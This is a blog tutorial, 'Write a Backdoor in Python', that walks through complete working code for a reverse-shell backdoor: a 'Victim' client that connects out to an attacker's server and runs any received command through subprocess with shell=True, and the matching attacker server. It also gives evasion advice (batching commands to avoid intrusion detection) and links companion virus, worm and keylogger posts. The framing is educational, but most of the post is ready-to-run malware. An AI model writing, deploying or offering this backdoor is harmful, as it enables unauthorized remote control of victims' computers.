---
layout: single
title: "Write a Backdoor in Python"
header:
  image: "https://live.staticflickr.com/65535/51222794626_b02e736eb2_z.jpg"
  teaser: "https://live.staticflickr.com/65535/51222794626_b02e736eb2_z.jpg"
categories:
  - Security
tags:
  - Python
  - Tutorial
  - Backdoor
  - Trojan Horse
  - Malware
toc: true
toc_label: "Table of Contents"
toc_icon: "heart"
---


Backdoors are a typical way of accessing a computers resources through command line without any sort of authentication. This type of remote access is difficult to identify as these programs act as the a program or other applications.

While going through the details of a backdoor, in this post, we will have a basic idea on server-client architecture alongside how a backdoor works. A basic one is nothing but a typical server-client communication except here, we want our commands to be executed on the victim machines.

In this post, we will learn what are the characteristics of a backdoor by writing a basic one in python. If you are interested to write other types of malwares, you can go through my previous posts:
* [Write a Simple Virus in Python](https://shantoroy.com/security/write-a-virus-in-python/)
* [Write a Worm (Malware) in Python](https://shantoroy.com/security/write-a-worm-malware-in-python/)
* [A Basic Keylogger in Python](https://shantoroy.com/security/a-simple-keylogger-in-python/)

## Server-Client Architecture
If you do not know socket programming, you might want to Google it as it itself can be a separate post. I am just putting the basic basic description of python sockets in the following.

The following diagram presents the stages of a TCP (connection-oriented) socket.
<figure>
  <a href="https://farm1.staticflickr.com/978/26960685907_41839085e6_b.jpg"><img src="https://farm1.staticflickr.com/978/26960685907_41839085e6_b.jpg"></a>
</figure>

### Server Socket Methods
<table>
<colgroup>
<col width="30%" />
<col width="70%" />
</colgroup>
<thead>
<tr class="header">
<th>Method</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td markdown="span">s.bind()</td>
<td markdown="span">binds address (hostname, port number pair) to socket</td>
</tr>
<tr>
<td markdown="span">s.listen()</td>
<td markdown="span">sets up and start TCP listener</td>
</tr>
<tr>
<td markdown="span">s.accept()</td>
<td markdown="span">passively accept TCP client connection, waiting until connection arrives</td>
</tr>
</tbody>
</table>

### Client Socket Methods
<table>
<colgroup>
<col width="30%" />
<col width="70%" />
</colgroup>
<thead>
<tr class="header">
<th>Method</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td markdown="span">s.connect()</td>
<td markdown="span">initiates TCP server connection</td>
</tr>
</tbody>
</table>

### Common Socket Methods
<table>
<colgroup>
<col width="30%" />
<col width="70%" />
</colgroup>
<thead>
<tr class="header">
<th>Method</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td markdown="span">s.recv()</td>
<td markdown="span">receives TCP message</td>
</tr>
<tr>
<td markdown="span">s.send()</td>
<td markdown="span">transmits TCP message</td>
</tr>
<tr>
<td markdown="span">s.close()</td>
<td markdown="span">closes socket</td>
</tr>
</tbody>
</table>

## Client/Victim-side Script
### Requirements
We need the following python modules to build our victim-side script. `socket` is used to provide the client-side methods we saw earlier. `subprocess` will be required to execute a command on the terminal. `ast` will only be used to convert a python `list-string` into a `list`. 
```python
import socket
import subprocess
import ast
```

Now, we will use `python class` to define victim-side methods. Point to be noted, you can simply use the socket functions without even creating a class. However, to make everything modular and to add further methods, I chose to design it as a class. 

### Initializer method
Now, let's create a class named `Victim` and write an initializer method that takes the `server IP address` and `server port` as arguments.
```python
class Victim:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port
```

### Connect to server
We need to launch a TCP connection and connect to the server. To do that, we need the following.
```python
    def connect_to_server(self):
        print("####################################")
        print("########## Client Program ##########")
        print("####################################")

        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        print("Msg: Client Initiated...")
        self.client.connect((self.server_ip, self.server_port))
        print("Msg: Connection initiated...")
```

### Interactions
There are two more methods: 
* Online Interaction: instantly execute any command and returns the standard output `stdout`
* Offline Interaction: executes a list of commands and then return all results altogether to the attacker

Whether to use the online/offline command execution, it is totally up to the attacker. Offline is better to avoid number of interactions that increases the chance of getting detected by an Intrusion Detection System (IDS).

Let's add those methods to our code as well. To be noted, `subprocess.Popen()` is the main method we use to run a command.

```python
    def online_interaction(self):
        while True:
            print("[+] Awaiting Shell Commands...")
            user_command = self.client.recv(1024).decode()
            # print("received command: $ ", user_command)
            op = subprocess.Popen(user_command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output = op.stdout.read()
            output_error = op.stderr.read()

            print("[+] Sending Command Output...")
            if output == b"" and output_error == b"":
                self.client.send(b"client_msg: no visible output")
            else:
                self.client.send(output + output_error)
```

```python
    def offline_interaction(self):
        print("[+] Awaiting Shell Command List...")
        rec_user_command_list = self.client.recv(1024).decode()
        user_command_list = ast.literal_eval(rec_user_command_list)

        final_output = ""
        for command in user_command_list:
            op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output = op.stdout.read()
            output_error = op.stderr.read()
            final_output += command + "\n" + str(output) + "\n" + str(output_error) + "\n\n"
        self.client.send(final_output.encode())
```

### Main Program
Now, let's create an object of the `Victim` class, connect to the server by calling the `connect_to_server()` method, and choose whether to use `online` or `offline` method. Use your local IP address instead of the loopback one if you run the `server.py` and `client.py` in different machines.
```python
if __name__ == '__main__':
    choice = "online"  # "offline"
    victim = Victim('127.0.0.1', 4000)
    victim.connect_to_server()

    if choice == "online":
        victim.online_interaction()
    else:
        victim.offline_interaction()
```

## Server/Attacker-side Script
Similarly for the server side, we create a class. and add the following methods.

Initializer method requires `ip address` and `port`.
```python
class Server:
    def __init__(self, host_ip, host_port):
        self.host_ip = host_ip
        self.host_port = host_port
```

Start server and listen to the victim to connect with, and then accept the connection.
```python
    def start_conn(self):
        print("####################################")
        print("######### Server Program #########")
        print("####################################")

        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((self.host_ip,self.host_port))

        print("Msg: Server Initiated...")
        print("Msg: Listening to the Client")

        server.listen(1)
        self.client, self.client_addr = server.accept()

        print("Msg: Received Connection from", self.client_addr)
```

The `online_interaction` takes a command as an input, sends the command to the client, and shows the output result afterwards follwed by taking another command as input again. 
```python
    def online_interaction(self):
        while True:
            interface = '[+] '+ str(self.client_addr[0]) + " :sh$ "
            command = input(interface)
            print(command)
            self.client.send(command.encode())
            recv_data = self.client.recv(1024).decode()
            if recv_data == b"":
                continue
            print("\n", recv_data, "\n")
```

To reduce the interaction, the `offline_interaction` method takes a list of commands as input, sends to the client, and then shows the received output to the attacker.
```python
    def offline_interaction(self,list_of_commands):
        self.client.send(str(list_of_commands).encode())
        recv_data = self.client.recv(1024).decode()
        print("Received output data from Client\n\n")
        print(recv_data)
```

and finally, run the main program by creating an object of the class `Server`, start connection by calling the method `start_conn()`, and choose to establish `online` or `offline` interaction with the client.
```python
if __name__ == '__main__':
    server = Server('127.0.0.1', 4000)
    server.start_conn()
    server.online_interaction()
    # server.offline_interaction(["ls", "pwd"])
```

Codes are available in the [Github Repository Folder](https://github.com/shantoroy/intro-2-cybersecurity-in-python/tree/master/backdoor).


You can look at other security concept tutorials in python. I have created a repository for that. I am planning to provide security concepts by writing python codes. Please feel free to put a star if you like the repository.

[Intro to Cybersecurity in Python](https://github.com/shantoroy/intro-2-cybersecurity-in-python)

Also, the associated blog post links are available in the `ReadMe` file over there.

Have a good day! Cheers!!!

If this post helps you to solve your problem, and you want to thank/support me for that, you can  [Buy me Coffee](https://www.paypal.me/shantoroy). :smiley:
<!--stackedit_data:
eyJoaXN0b3J5IjpbLTE0MTI3Njg5NDUsLTE1OTYxNjI0NDgsMj
AzOTkyODczMSwtMTg4MDM1NzQyNSw3OTQ1Mzc0NTAsMTk2NDU5
MDgyMF19
-->